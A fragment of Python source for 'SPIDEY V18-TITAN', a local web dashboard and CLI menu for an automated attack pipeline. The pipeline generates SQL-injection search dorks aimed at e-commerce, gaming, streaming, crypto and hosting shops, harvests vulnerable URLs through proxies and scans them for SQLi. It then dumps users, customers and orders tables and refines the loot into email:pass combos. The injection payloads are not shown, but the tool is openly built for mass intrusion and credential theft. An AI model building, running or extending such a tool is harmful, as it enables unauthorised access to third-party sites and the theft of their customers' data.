# MODERN DARK-CYBER LOCAL DESKTOP WEB CONTROL PANEL (`http://0.0.0.0:8080`)
# ==============================================================================
DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>SPIDEY V18-TITAN — Offline & Local Suite</title>
<style>
  :root {
    --bg: #07090f; --panel: #0e1320; --panel2: #141b2d; --border: #1f2b46;
    --accent: #00e5ff; --accent2: #7c4dff; --green: #00e676; --amber: #ffab00; --red: #ff5252;
    --text: #e6edf7; --muted: #8b9bb4;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: var(--bg); color: var(--text); font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; min-height: 100vh; }
  header {
    background: linear-gradient(90deg, #0b1020 0%, #121a33 55%, #0b1020 100%);
    border-bottom: 1px solid var(--border); padding: 14px 22px;
    display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px;
  }
  .brand { display: flex; align-items: center; gap: 12px; }
  .badge { background: rgba(0,229,255,0.13); border: 1px solid var(--accent); color: var(--accent); padding: 3px 10px; border-radius: 99px; font-size: 11px; font-weight: 700; letter-spacing: 0.6px; }
  .badge-off { background: rgba(0,230,118,0.13); border: 1px solid var(--green); color: var(--green); }
  .top-controls { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
  select, input, textarea {
    background: #090d16; color: var(--text); border: 1px solid var(--border);
    border-radius: 8px; padding: 9px 12px; font-size: 13px; outline: none; width: 100%;
  }
  select:focus, input:focus, textarea:focus { border-color: var(--accent); }
  .layout { display: grid; grid-template-columns: 255px 1fr 360px; gap: 16px; padding: 16px; max-width: 1720px; margin: 0 auto; }
  @media (max-width: 1220px) { .layout { grid-template-columns: 1fr; } }
  .card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 16px; }
  .nav-btn {
    width: 100%; text-align: left; background: transparent; color: var(--text); border: 1px solid transparent;
    padding: 10px 12px; border-radius: 9px; cursor: pointer; font-size: 13px; font-weight: 600;
    display: flex; align-items: center; justify-content: space-between; margin-bottom: 5px; transition: 0.15s;
  }
  .nav-btn:hover { background: var(--panel2); border-color: var(--border); }
  .nav-btn.active { background: linear-gradient(90deg, rgba(0,229,255,0.16), rgba(124,77,255,0.16)); border-color: var(--accent); color: #fff; }
  .tag-pill { font-size: 10px; padding: 2px 6px; border-radius: 5px; background: #19243c; color: var(--muted); }
  .tag-pure { background: rgba(0,230,118,0.16); color: var(--green); }
  .btn {
    background: linear-gradient(90deg, #00b8d4, #651fff); color: #fff; border: none; border-radius: 8px;
    padding: 11px 18px; font-weight: 700; font-size: 13px; cursor: pointer; transition: 0.15s; display: inline-flex; align-items: center; gap: 7px;
  }
  .btn:hover { filter: brightness(1.12); transform: translateY(-1px); }
  .btn-stop { background: linear-gradient(90deg, #ff1744, #d50000); }
  .btn-sm { padding: 6px 10px; font-size: 11.5px; border-radius: 6px; text-decoration: none; }
  .btn-sec { background: var(--panel2); border: 1px solid var(--border); color: var(--text); }
  .progress-wrap { background: #090d16; border: 1px solid var(--border); border-radius: 99px; height: 14px; overflow: hidden; margin: 10px 0; }
  .progress-bar { height: 100%; background: linear-gradient(90deg, var(--accent), var(--green)); width: 0%; transition: width 0.35s ease; }
  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-top: 10px; }
  .stat-box { background: var(--panel2); border: 1px solid var(--border); border-radius: 8px; padding: 9px 10px; }
  .stat-lbl { font-size: 11px; color: var(--muted); }
  .stat-val { font-size: 16px; font-weight: 800; color: #fff; margin-top: 2px; }
  .log-box {
    background: #05070c; border: 1px solid var(--border); border-radius: 9px; padding: 10px;
    height: 250px; overflow-y: auto; font-family: "JetBrains Mono", Consolas, monospace; font-size: 11.5px; line-height: 1.55; color: #b7c8e2;
  }
  .field { margin-bottom: 12px; }
  .field label { display: block; font-size: 12px; font-weight: 600; color: var(--muted); margin-bottom: 5px; }
  .preset-chips { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 10px; }
  .chip { background: var(--panel2); border: 1px solid var(--border); color: var(--accent); padding: 5px 10px; border-radius: 99px; font-size: 11.5px; cursor: pointer; }
  .chip:hover { border-color: var(--accent); background: rgba(0,229,255,0.12); }
  .file-item { background: var(--panel2); border: 1px solid var(--border); border-radius: 8px; padding: 9px 11px; margin-bottom: 8px; font-size: 12px; }
  .file-actions { display: flex; gap: 6px; margin-top: 6px; flex-wrap: wrap; }
  .qc-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 10px; }
  .hidden { display: none; }
  h2 { font-size: 17px; margin-bottom: 4px; }
  .sub { font-size: 12.5px; color: var(--muted); margin-bottom: 14px; }
</style>
</head>
<body>
<header>
  <div class="brand">
    <div style="font-size:24px">🕷️</div>
    <div>
      <div style="font-weight:800;font-size:16px;letter-spacing:0.4px">SPIDEY V18-TITAN — LOCAL & OFFLINE SUITE</div>
      <div style="font-size:11.5px;color:var(--muted)">100% Zero-Telegram Standalone Desktop/VPS Engine • Unlimited File Size • Direct Disk Streaming</div>
    </div>
    <span class="badge badge-off">ZERO TELEGRAM NEEDED</span>
  </div>
  <div class="top-controls">
    <div>
      <select id="hwProfile" onchange="updateSettings()" style="width:270px">
        <option value="auto">⚡ Hardware: Auto-Detect</option>
        <option value="low">🟢 Low (Laptop / 2–4 GB RAM)</option>
        <option value="medium">🟡 Medium (4-Core / 8 GB RAM)</option>
        <option value="high">🟠 High (8-Core / 16–32 GB RAM)</option>
        <option value="beast">🔥 Beast (12+ Core / 62 GB VPS)</option>
      </select>
    </div>
    <div>
      <select id="parserMode" onchange="updateSettings()" style="width:185px">
        <option value="blitz">⚡ Parser: Blitz Fast</option>
        <option value="balanced" selected>⚖️ Parser: Balanced UHQ</option>
        <option value="deep">💎 Parser: Deep Harvest</option>
      </select>
    </div>
    <button class="btn btn-stop" onclick="stopJob()">🛑 STOP JOB</button>
  </div>
</header>

<div class="layout">
  <!-- LEFT MODULE SIDEBAR -->
  <div class="card">
    <div style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;margin-bottom:8px">Pipeline Modules</div>
    <button class="nav-btn active" onclick="showTab('autopilot', this)"><span>🚀 1-Click Auto-Pilot</span><span class="tag-pill">ALL-IN-1</span></button>
    <button class="nav-btn" onclick="showTab('ai_keywords', this)"><span>🧠 1. AI Keyword Maker</span><span class="tag-pill tag-pure">100% OFFLINE</span></button>
    <button class="nav-btn" onclick="showTab('kw_quality', this)"><span>💎 2. Keyword Quality</span><span class="tag-pill tag-pure">100% OFFLINE</span></button>
    <button class="nav-btn" onclick="showTab('dork_gen', this)"><span>🔥 3. UHQ Dork Maker</span><span class="tag-pill tag-pure">100% OFFLINE</span></button>
    <button class="nav-btn" onclick="showTab('proxy_scrape', this)"><span>🌐 4. Proxy Manager</span><span class="tag-pill">NET</span></button>
    <button class="nav-btn" onclick="showTab('url_parser', this)"><span>🛰️ 5. UHQ URL Parser</span><span class="tag-pill">18-ENG</span></button>
    <button class="nav-btn" onclick="showTab('sqli_scan', this)"><span>🦠 6. SQLi Vuln Scanner</span><span class="tag-pill">MULTI-CORE</span></button>
    <button class="nav-btn" onclick="showTab('db_dump', this)"><span>💣 7. Auto DB & Combo Dump</span><span class="tag-pill">UNION/ERR</span></button>
    <button class="nav-btn" onclick="showTab('refinery', this)"><span>🧰 8. Combo/URL Refinery</span><span class="tag-pill tag-pure">100% OFFLINE</span></button>

    <div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border);font-size:11.5px;color:var(--muted);line-height:1.6">
      <b style="color:var(--green)">💡 Offline vs Online Tip:</b><br/>
      • <b>Modules 1, 2, 3, 8</b> bina internet ke bhi <b>100% Pure Offline</b> PC/Laptop par chalte hain!<br/>
      • <b>Modules 4, 5, 6, 7</b> jab internet/proxy ON ho tab seedha aapke PC ya VPS se target sites scan & dump karte hain (bina kisi Telegram limit ke!).
    </div>
  </div>

  <!-- CENTER WORKBENCH + LIVE TELEMETRY -->
  <div>
    <!-- LIVE ENGINE MONITOR -->
    <div class="card" style="margin-bottom:16px">
      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px">
        <div>
          <span class="badge" id="stModule">IDLE</span>
          <span style="margin-left:8px;font-weight:700;font-size:14px" id="stPhase">Ready</span>
        </div>
        <div style="font-size:12px;color:var(--accent);font-weight:700" id="stExtra"></div>
      </div>
      <div class="progress-wrap"><div class="progress-bar" id="stBar"></div></div>
      <div class="stats-row">
        <div class="stat-box"><div class="stat-lbl">PROGRESS</div><div class="stat-val" id="stProg">0 / 0 (0%)</div></div>
        <div class="stat-box"><div class="stat-lbl">HITS / FOUND</div><div class="stat-val" style="color:var(--green)" id="stHits">0</div></div>
        <div class="stat-box"><div class="stat-lbl">SPEED</div><div class="stat-val" id="stRate">0.0 /s</div></div>
        <div class="stat-box"><div class="stat-lbl">ELAPSED</div><div class="stat-val" id="stTime">0.0s</div></div>
      </div>

      <!-- KEYWORD QUALITY VISUAL BREAKDOWN (Appears automatically after Quality Check!) -->
      <div id="qcPanel" class="hidden" style="margin-top:12px;padding-top:12px;border-top:1px solid var(--border)">
        <div style="font-size:12.5px;font-weight:700;margin-bottom:6px">💎 Keyword Quality Breakdown</div>
        <div class="qc-grid" id="qcCards"></div>
      </div>
    </div>

    <!-- ACTIVE MODULE FORM -->
    <div class="card" style="margin-bottom:16px">
      <div id="tab-autopilot" class="tab-pane">
        <h2>🚀 1-Click Full End-to-End Auto-Pilot Pipeline</h2>
        <div class="sub">Topic/Seeds ➔ UHQ Keywords ➔ Quality Filter (Premium+Good) ➔ UHQ SQLi Dorks ➔ 18-Engine URL Parser ➔ SQLi Scanner ➔ Automated DB & Combo Dumper</div>
        <div class="preset-chips">
          <span class="chip" onclick="setSeed('apText','stripe checkout, woocommerce shop, giftcard store')">💳 Stripe / E-Com</span>
          <span class="chip" onclick="setSeed('apText','steam wallet, valorant topup, cdkey store')">🎮 Gaming & Keys</span>
          <span class="chip" onclick="setSeed('apText','netflix premium, iptv panel, spotify plan')">🎬 OTT / Streaming</span>
          <span class="chip" onclick="setSeed('apText','crypto voucher, usdt shop, bitrefill store')">🪙 Crypto / Fintech</span>
          <span class="chip" onclick="setSeed('apText','whmcs clientarea, cpanel hosting, vps billing')">☁️ Hosting / SaaS</span>
        </div>
        <div class="field"><label>Seed Keywords / Target Niche (comma or newline separated)</label>
          <textarea id="apText" rows="3">stripe checkout, woocommerce store, gaming topup</textarea>
        </div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px" class="field">
          <div><label>Keywords Count</label><input type="number" id="apKwCount" value="2000"/></div>
          <div><label>UHQ SQLi Dorks Count</label><input type="number" id="apDorkCount" value="5000"/></div>
        </div>
        <button class="btn" onclick="startAutoPilot()">🚀 START FULL END-TO-END AUTO-PILOT</button>
      </div>

      <div id="tab-ai_keywords" class="tab-pane hidden">
        <h2>🧠 Module 1: AI Target ➔ UHQ Keyword Generator (100% Pure Offline Ready)</h2>
        <div class="sub">Bina kisi API key aur bina internet ke high-converting commercial + database footprint UHQ keywords banata hai.</div>
        <div class="preset-chips">
          <span class="chip" onclick="setSeed('kwText','stripe checkout, woocommerce store')">💳 E-Commerce / Stripe</span>
          <span class="chip" onclick="setSeed('kwText','steam wallet, gaming topup, cdkeys')">🎮 Gaming Topup</span>
          <span class="chip" onclick="setSeed('kwText','netflix premium, iptv subscription')">🎬 OTT Streaming</span>
          <span class="chip" onclick="setSeed('kwText','usdt voucher, crypto checkout')">🪙 Crypto</span>
        </div>
        <div class="field"><label>Target Niche / Seed Words</label><textarea id="kwText" rows="4">stripe checkout, giftcard store, gaming topup</textarea></div>
        <div class="field"><label>Exact Keywords Count (`500` – `2,000,000`)</label><input type="number" id="kwCount" value="5000"/></div>
        <button class="btn" onclick="runSimple('ai_keywords', {text: val('kwText'), count: val('kwCount')})">⚡ GENERATE UHQ KEYWORDS</button>
      </div>

      <div id="tab-kw_quality" class="tab-pane hidden">
        <h2>💎 Module 2: Keyword Quality Checker (Keevo-Style Multi-Signal Engine)</h2>
        <div class="sub">Har keyword ko 0–100 score dekar 💎 Premium, 🟢 Good, 🟡 Normal, 🔴 Bad me split karta hai + All-Tiers ZIP save karta hai.</div>
        <div class="field"><label>Select Saved Workspace File (Optional — 1-Click Chain!)</label><select class="ws-select" id="qcFile"></select></div>
        <div class="field"><label>Or Upload `.txt` / `.zip` File From PC/Phone</label><input type="file" onchange="uploadFile(this, 'qcFile')"/></div>
        <div class="field"><label>Or Paste Keywords Directly</label><textarea id="qcText" rows="5" placeholder="One keyword per line..."></textarea></div>
        <button class="btn" onclick="runSimple('kw_quality', {source_rel: val('qcFile'), text: val('qcText')})">🔍 CHECK KEYWORD QUALITY NOW</button>
      </div>

      <div id="tab-dork_gen" class="tab-pane hidden">
        <h2>🔥 Module 3: UHQ SQLi & High-Hit Dork Generator (Up to 50 Lakh Dorks!)</h2>
        <div class="sub">Zero Telegram 50MB limit — seedha disk pe clean 2–3 word Google `inurl:` + Bing `instreamset:` high-hit SQLi dorks stream karta hai!</div>
        <div class="field"><label>Select Keywords File From Workspace</label><select class="ws-select" id="dkFile"></select></div>
        <div class="field"><label>Or Upload Keywords `.txt` / `.zip`</label><input type="file" onchange="uploadFile(this, 'dkFile')"/></div>
        <div class="field"><label>Or Paste Keywords Directly</label><textarea id="dkText" rows="4" placeholder="stripe store&#10;gaming topup"></textarea></div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px" class="field">
          <div><label>Target Dorks Count (`1,000` – `5,000,000`)</label><input type="number" id="dkCount" value="50000"/></div>
          <div><label>Engine Dork Syntax</label>
            <select id="dkStyle">
              <option value="mixed" selected>🌐 Universal Mix (Google + Bing + Yahoo + Brave)</option>
              <option value="bing_native">⚡ Pure Bing / Yahoo / DDG Native (Zero inurl: poison)</option>
              <option value="google_inurl">🔍 Pure Google `inurl:script.php?param=`</option>
            </select>
          </div>
        </div>
        <button class="btn" onclick="runSimple('dork_gen', {source_rel: val('dkFile'), text: val('dkText'), count: val('dkCount'), style: val('dkStyle')})">🔥 GENERATE UHQ DORKS TO DISK</button>
      </div>

      <div id="tab-proxy_scrape" class="tab-pane hidden">
        <h2>🌐 Module 4: Multi-Source Proxy Scraper & Real Bing SERP Judge</h2>
        <div class="sub">Public feeds + aapki custom proxy list ko real search engine (`bing.com`) ke against test karke sirf working fast proxies save karta hai.</div>
        <div class="field"><label>Upload Custom Proxies `.txt` (Optional)</label><input type="file" onchange="uploadFile(this, 'pxFile')"/><select class="ws-select hidden" id="pxFile"></select></div>
        <div class="field"><label>Or Paste Proxies (`ip:port` / `http://user:pass@ip:port` / `socks5://...`)</label><textarea id="pxText" rows="4" placeholder="Leave blank to auto-scrape fresh GitHub feeds..."></textarea></div>
        <div class="field"><label>Max Proxies To Judge</label><input type="number" id="pxCount" value="800"/></div>
        <button class="btn" onclick="runSimple('proxy_scrape', {source_rel: val('pxFile'), text: val('pxText'), count: val('pxCount')})">🌐 SCRAPE & VERIFY PROXIES</button>
      </div>

      <div id="tab-url_parser" class="tab-pane hidden">
        <h2>🛰️ Module 5: 18-Engine UHQ URL Parser + Live Website DOM `?param=` Spider</h2>
        <div class="sub">Har second milne wali `?param=` SQLi URLs live disk file me save hoti rehti hain — beech me STOP karne par bhi 0% data loss!</div>
        <div class="field"><label>Select Dorks File From Workspace</label><select class="ws-select" id="prFile"></select></div>
        <div class="field"><label>Or Upload Dorks `.txt` / `.zip` (e.g. `UHQ_SQLi_Dorks_50000.txt`)</label><input type="file" onchange="uploadFile(this, 'prFile')"/></div>
        <div class="field"><label>Or Paste Dorks Directly</label><textarea id="prText" rows="4" placeholder="product.php?id= stripe store"></textarea></div>
        <button class="btn" onclick="runSimple('url_parser', {source_rel: val('prFile'), text: val('prText')})">🛰️ START UHQ URL PARSER</button>
      </div>

      <div id="tab-sqli_scan" class="tab-pane hidden">
        <h2>🦠 Module 6: High-Speed SQLi Vulnerability Scanner</h2>
        <div class="sub">Error-Based (`MySQL / MariaDB / PostgreSQL / MSSQL / Oracle / SQLite`) + Boolean Differential testing ke saath real injectable endpoints filter karta hai.</div>
        <div class="field"><label>Select `?param=` URLs File From Workspace</label><select class="ws-select" id="sqFile"></select></div>
        <div class="field"><label>Or Upload URLs `.txt` / `.zip`</label><input type="file" onchange="uploadFile(this, 'sqFile')"/></div>
        <div class="field"><label>Or Paste URLs Directly</label><textarea id="sqText" rows="4" placeholder="https://example-shop.com/product.php?id=15"></textarea></div>
        <button class="btn" onclick="runSimple('sqli_scan', {source_rel: val('sqFile'), text: val('sqText')})">🦠 START SQLi VULNERABILITY SCAN</button>
      </div>

      <div id="tab-db_dump" class="tab-pane hidden">
        <h2>💣 Module 7: Automated UNION / Error SQLi Database & Combo Dumper</h2>
        <div class="sub">Confirmed vulnerable URLs se `DATABASE()`, `users / customers / members / orders` tables, rows CSV aur clean `email:pass` combos extract karta hai.</div>
        <div class="field"><label>Select Vulnerable URLs File From Workspace</label><select class="ws-select" id="dmFile"></select></div>
        <div class="field"><label>Or Upload Vulnerable URLs `.txt`</label><input type="file" onchange="uploadFile(this, 'dmFile')"/></div>
        <div class="field"><label>Or Paste Vulnerable URLs Directly</label><textarea id="dmText" rows="4" placeholder="http://target-site.com/item.php?id=7"></textarea></div>
        <button class="btn" onclick="runSimple('db_dump', {source_rel: val('dmFile'), text: val('dmText')})">💣 START AUTOMATED DB & COMBO DUMP</button>
      </div>

      <div id="tab-refinery" class="tab-pane hidden">
        <h2>🧰 Module 8: Offline Multi-Million Line Combo / Email / URL Refinery</h2>
        <div class="sub">100% Pure Offline — Badi `.sql`, `.csv`, `.txt` dumps se clean `email:pass` combos, pure emails, ya unique `?param=` URLs nikalta hai.</div>
        <div class="field"><label>Select Workspace File</label><select class="ws-select" id="rfFile"></select></div>
        <div class="field"><label>Or Upload `.txt` / `.sql` / `.csv` / `.zip`</label><input type="file" onchange="uploadFile(this, 'rfFile')"/></div>
        <div class="field"><label>Or Paste Raw Lines</label><textarea id="rfText" rows="4"></textarea></div>
        <div class="field"><label>Refinery Mode</label>
          <select id="rfMode">
            <option value="combos">🔑 Extract Clean Unique `email:pass` Combos</option>
            <option value="emails">📧 Extract Pure Unique Emails Only</option>
            <option value="param_urls">🎯 Filter Unique Injectable `?param=` URLs</option>
            <option value="dedup">🧹 Exact Line Deduplicator & Cleaner</option>
          </select>
        </div>
        <button class="btn" onclick="runSimple('refinery', {source_rel: val('rfFile'), text: val('rfText'), mode: val('rfMode')})">🧰 RUN OFFLINE REFINERY</button>
      </div>
    </div>

    <!-- LIVE CONSOLE LOG -->
    <div class="card">
      <div style="display:flex;justify-content:space-between;margin-bottom:6px">
        <span style="font-size:12px;font-weight:700;color:var(--muted)">🖥️ LIVE ENGINE CONSOLE</span>
        <span style="font-size:11px;color:var(--muted)">Auto-refreshing every 1s</span>
      </div>
      <div class="log-box" id="logBox"></div>
    </div>
  </div>

  <!-- RIGHT WORKSPACE OUTPUT VAULT -->
  <div class="card">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
      <div>
        <div style="font-weight:800;font-size:14px">📂 Local Output Vault</div>
        <div style="font-size:11px;color:var(--muted)">Saved directly on your disk (`spidey_offline_workspace/`)</div>
      </div>
      <button class="btn btn-sec btn-sm" onclick="refreshFiles()">🔄 Refresh</button>
    </div>
    <div id="filesList" style="max-height:740px;overflow-y:auto"></div>
  </div>
</div>

<script>
function val(id) { const el = document.getElementById(id); return el ? el.value : ''; }
function setSeed(id, txt) { document.getElementById(id).value = txt; }

function showTab(name, btn) {
  document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
  const target = document.getElementById('tab-' + name);
  if (target) target.classList.remove('hidden');
  if (btn) {
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
  }
}

function chainFileToTab(relPath, tabName, selectId) {
  const btns = document.querySelectorAll('.nav-btn');
  const idxMap = {autopilot:0, ai_keywords:1, kw_quality:2, dork_gen:3, proxy_scrape:4, url_parser:5, sqli_scan:6, db_dump:7, refinery:8};
  showTab(tabName, btns[idxMap[tabName] || 0]);
  refreshFiles().then(() => {
    const s = document.getElementById(selectId);
    if (s) s.value = relPath;
  });
}

async function runSimple(action, payload) {
  const r = await fetch('api/run', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({action, ...payload})
  });
  const d = await r.json();
  if (!d.ok) alert(d.error || 'Could not start job');
  pollStatus();
}

function startAutoPilot() {
  runSimple('full_autopilot', {
    text: val('apText'),
    kw_count: val('apKwCount'),
    dork_count: val('apDorkCount')
  });
}

async function stopJob() {
  await fetch('api/stop', {method: 'POST'});
  pollStatus();
}

async function updateSettings() {
  await fetch('api/settings', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      profile: val('hwProfile'),
      parser_mode: val('parserMode')
    })
  });
}

async function uploadFile(inputEl, targetSelectId) {
  if (!inputEl.files || !inputEl.files[0]) return;
  const f = inputEl.files[0];
  const r = await fetch('api/upload?filename=' + encodeURIComponent(f.name), {
    method: 'POST',
    body: f
  });
  const d = await r.json();
  if (d.ok) {
    await refreshFiles();
    const sel = document.getElementById(targetSelectId);
    if (sel) sel.value = d.rel_path;
  } else {
    alert('Upload failed: ' + (d.error || 'unknown'));
  }
}

let lastFileSig = '';
async function refreshFiles() {
  const r = await fetch('api/files');
  const d = await r.json();
  const files = d.files || [];
  const sig = files.map(f => f.rel_path + ':' + f.size_kb).join('|');
  if (sig === lastFileSig) return;
  lastFileSig = sig;

  document.querySelectorAll('.ws-select').forEach(sel => {
    const prev = sel.value;
    sel.innerHTML = '<option value="">-- Select a saved file from workspace (optional) --</option>' +
      files.map(f => `<option value="${f.rel_path}">[${f.category}] ${f.name} (${f.size_kb} KB)</option>`).join('');
    if (prev) sel.value = prev;
  });

  const box = document.getElementById('filesList');
  if (!files.length) {
    box.innerHTML = '<div style="color:var(--muted);font-size:12px">No generated files yet — run any module on the left!</div>';
    return;
  }
  const nextTabFor = cat => {
    if (cat === 'keywords') return ['kw_quality', 'qcFile', '💎 Quality Check'];
    if (cat === 'quality_checks') return ['dork_gen', 'dkFile', '🔥 Make Dorks'];
    if (cat === 'dorks') return ['url_parser', 'prFile', '🛰️ Parse URLs'];
    if (cat === 'parsed_urls') return ['sqli_scan', 'sqFile', '🦠 Scan SQLi'];
    if (cat === 'sqli_vulns') return ['db_dump', 'dmFile', '💣 Dump DB'];
    return ['refinery', 'rfFile', '🧰 Refine'];
  };
  box.innerHTML = files.map(f => {
    const [nt, ns, nlabel] = nextTabFor(f.category);
    return `<div class="file-item">
      <div style="font-weight:700;word-break:break-all">${f.name}</div>
      <div style="color:var(--muted);font-size:11px;margin-top:2px">📁 ${f.category} • ${f.size_kb} KB • ${f.time_str}</div>
      <div class="file-actions">
        <a class="btn btn-sm" href="api/download?rel=${encodeURIComponent(f.rel_path)}">⬇️ Download</a>
        <button class="btn btn-sec btn-sm" onclick="chainFileToTab('${f.rel_path}','${nt}','${ns}')">${nlabel} ➡️</button>
      </div>
    </div>`;
  }).join('');
}

let wasRunning = false;
async function pollStatus() {
  try {
    const r = await fetch('api/status');
    const s = await r.json();
    document.getElementById('stModule').textContent = s.running ? ('⚡ ' + s.module) : '✅ READY';
    document.getElementById('stPhase').textContent = s.phase;
    document.getElementById('stExtra').textContent = s.extra_stat || '';
    document.getElementById('stBar').style.width = s.pct + '%';
    document.getElementById('stProg').textContent = `${s.done.toLocaleString()} / ${s.total.toLocaleString()} (${s.pct}%)`;
    document.getElementById('stHits').textContent = s.hits.toLocaleString();
    document.getElementById('stRate').textContent = `${s.rate}/s`;
    document.getElementById('stTime').textContent = `${s.elapsed}s`;

    const lb = document.getElementById('logBox');
    lb.textContent = (s.logs || []).join('\n');
    lb.scrollTop = lb.scrollHeight;

    if (s.qc_summary) {
      document.getElementById('qcPanel').classList.remove('hidden');
      const c = s.qc_summary.counts, p = s.qc_summary.pct;
      document.getElementById('qcCards').innerHTML = `
        <div class="stat-box"><div class="stat-lbl">💎 PREMIUM (UHQ)</div><div class="stat-val" style="color:#00e5ff">${c.premium.toLocaleString()} (${p.premium}%)</div></div>
        <div class="stat-box"><div class="stat-lbl">🟢 GOOD (HQ)</div><div class="stat-val" style="color:#00e676">${c.good.toLocaleString()} (${p.good}%)</div></div>
        <div class="stat-box"><div class="stat-lbl">🟡 NORMAL</div><div class="stat-val" style="color:#ffab00">${c.normal.toLocaleString()} (${p.normal}%)</div></div>
        <div class="stat-box"><div class="stat-lbl">🔴 BAD / FILTERED</div><div class="stat-val" style="color:#ff5252">${c.bad.toLocaleString()} (${p.bad}%)</div></div>
      `;
    }
    if (wasRunning && !s.running) refreshFiles();
    wasRunning = s.running;
  } catch (e) {}
}

(async function init() {
  const r = await fetch('api/status');
  const s = await r.json();
  if (s.limits) {
    document.getElementById('hwProfile').value = s.limits.profile_key || 'auto';
    document.getElementById('parserMode').value = s.limits.parser_mode || 'balanced';
  }
  await refreshFiles();
  await pollStatus();
  setInterval(pollStatus, 1000);
  setInterval(refreshFiles, 4000);
})();
</script>
</body>
</html>
"""


class SuiteHTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        return  # Keep terminal clean & zero-overhead

    def _send_json(self, obj: dict, status: int = 200) -> None:
        body = json.dumps(obj).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        route = parsed.path.rstrip("/") or "/"
        qs = urllib.parse.parse_qs(parsed.query)

        if route in ("/", "/index.html"):
            body = DASHBOARD_HTML.encode("utf-8")
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        if route.endswith("/api/status"):
            self._send_json(JOB.snapshot())
            return

        if route.endswith("/api/files"):
            self._send_json({"files": list_workspace_files()})
            return

        if route.endswith("/api/download"):
            rel = (qs.get("rel") or [""])[0]
            target = (WORK_DIR / rel).resolve()
            if not str(target).startswith(str(WORK_DIR.resolve())) or not target.is_file():
                self._send_json({"ok": False, "error": "File not found"}, 404)
                return
            size = target.stat().st_size
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", f'attachment; filename="{target.name}"')
            self.send_header("Content-Length", str(size))
            self.end_headers()
            with open(target, "rb") as rf:
                shutil.copyfileobj(rf, self.wfile)
            return

        self._send_json({"ok": False, "error": "Not found"}, 404)

    def do_POST(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        route = parsed.path.rstrip("/")
        qs = urllib.parse.parse_qs(parsed.query)
        length = int(self.headers.get("Content-Length") or 0)

        if route.endswith("/api/upload"):
            fname = os.path.basename((qs.get("filename") or ["upload.txt"])[0])
            safe_name = re.sub(r"[^a-zA-Z0-9_.\-]", "_", fname) or "upload.txt"
            dest = WORK_DIR / "uploads" / f"{datetime.now().strftime('%H%M%S')}_{safe_name}"
            remaining = length
            with open(dest, "wb") as wf:
                while remaining > 0:
                    chunk = self.rfile.read(min(65536, remaining))
                    if not chunk:
                        break
                    wf.write(chunk)
                    remaining -= len(chunk)
            rel = str(dest.relative_to(WORK_DIR))
            JOB.log(f"📤 Uploaded `{dest.name}` ({dest.stat().st_size / 1024:,.1f} KB)")
            self._send_json({"ok": True, "rel_path": rel, "name": dest.name})
            return

        raw_body = self.rfile.read(length).decode("utf-8", errors="ignore") if length > 0 else "{}"
        try:
            data = json.loads(raw_body) if raw_body else {}
        except Exception:
            data = {}

        if route.endswith("/api/stop"):
            JOB.request_stop()
            self._send_json({"ok": True})
            return

        if route.endswith("/api/settings"):
            updated = save_settings({
                k: data[k] for k in ("profile", "parser_mode", "use_proxies", "online_autocomplete") if k in data
            })
            JOB.log(f"⚙️ Updated Hardware/Engine Profile -> {updated['profile'].upper()} ({updated['parser_mode']})")
            self._send_json({"ok": True, "settings": updated})
            return

        if route.endswith("/api/run"):
            action = str(data.get("action") or "")
            ok, msg = launch_module_task(action, data)
            self._send_json({"ok": ok, "message": msg, "error": "" if ok else msg})
            return

        self._send_json({"ok": False, "error": "Unknown endpoint"}, 404)


# ==============================================================================
# INTERACTIVE SSH / CMD TERMINAL MODE (`python3 spidey_offline_suite.py --cli`)
# ==============================================================================
def run_interactive_cli() -> None:
    while True:
        lim = get_active_limits()
        print("\n" + "=" * 72)
        print(f"  🕷️  {SUITE_VERSION} — INTERACTIVE TERMINAL EDITION")
        print(f"  ⚙️  Active Profile : {lim['label']}")
        print(f"  📂 Output Folder  : {WORK_DIR}")
        print("=" * 72)
        print("  [1] 🧠 AI UHQ Keyword Generator        (100% Pure Offline)")
        print("  [2] 💎 Keyword Quality Checker         (100% Pure Offline)")
        print("  [3] 🔥 UHQ SQLi Dork Generator         (100% Pure Offline — Up to 50L)")
        print("  [4] 🌐 Scrape & Verify SERP Proxies    (Requires Internet)")
        print("  [5] 🛰️ 18-Engine UHQ URL Parser        (Requires Internet / Proxies)")
        print("  [6] 🦠 High-Speed SQLi Vuln Scanner    (Requires Internet)")
        print("  [7] 💣 Automated DB & Combo Dumper     (Requires Internet)")
        print("  [8] 🧰 Combo / Email / URL Refinery    (100% Pure Offline)")
        print("  [9] 🚀 1-Click Full End-to-End Auto-Pilot Pipeline")
        print("  [0] ❌ Exit")
        print("=" * 72)
